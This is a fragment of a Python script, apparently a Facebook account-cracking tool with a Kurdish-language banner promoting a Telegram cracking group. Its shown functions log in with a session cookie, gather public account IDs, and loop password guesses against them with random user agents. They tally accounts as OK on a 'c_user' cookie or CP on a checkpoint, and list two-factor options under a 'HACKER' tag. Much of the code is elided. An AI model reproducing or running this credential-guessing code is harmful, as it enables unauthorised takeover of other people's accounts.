...
AM TOOLA FREEE BO EWA BA XOSHE BAKARE BENN
BALEN UP     
\33[0;92m
\33[0;92 \033[1;32mTELEGRAM  : AUTHOR 
@cp_uui my talegram👈👌
RS7_TEAM👊🔥
\33[0;92m \033[1;34mCHANNEL  :@NCCHAPTER
''')
# LOGIN
def login():
	try:
...
def login_c():
	try:
		...
		print('%s[%s✔%s]%s Login cookie drosta run again \033[1;97m\033[1;41m python BALEN0.1.py \033[0m\033[1;93m'%(N,H,N,H));time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_njjkamhhe,my_id):
	...
	print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m Your NO : "+str(my_id)) 
	print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m Name    : "+str(my_name))
	try:
		gep = requests.get('http://ipinfo.io/json').json()
		print("%s[%s✔%s]%s  NO  :%s %s"%(H,P,H,P,K,gep['No']))
		print("%s[%s✔%s]%s  NO      :%s %s\n"%(H,P,H,P,K,gep['NO']))
	
	except:
		print("%s[%s✔%s]%s NO :%s -"%(H,P,H,P,K))
		print("%s[%s✔%s]%s NO :%s -"%(H,P,H,P,K))
	...
	print('%s[%sB%s]%s DARCHUN LA TOOL %s[%sLogOut%s]'%(P,H,P,H,P,H,P))
	...
	if MRBX in ['1','01']:
		...
		os.system('xdg-open https://t.me/krd_crackers');menu(my_name,my_id)
	elif MRBX in ['B','b']:
...
def public():
	try:
		...
		exit()
	try:
		jum = int(input('[?] CHAND IDS DAWE : '))
	except ValueError:
		time.sleep(3)
		print('{k}[✘] ID public NYa! ')
		follower()
	if jum<1:
		print('[✘] Your limit nabee!!!! (error)')
		exit()
	ses=requests.Session()
	yz = 0
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}[CRACK]{P}[{k}{loop}{P}/{h}{len(id)}{P}]-{P}[{H}OK - {ok}{P}]-{P}[{k}CP - {cp}{x}]-[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[CRACK]{P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}--{ok}-{P}]—{P}[{k}--{cp}-{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s[CRACK]%s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s[Xnot]--> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s[HACKER]%s%s'%(kk,opsii.text,x))
				except:
					print('\r%s[CRACK]%s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s[CRACK]%s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s[CRACK]%s|%s ----> ID       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
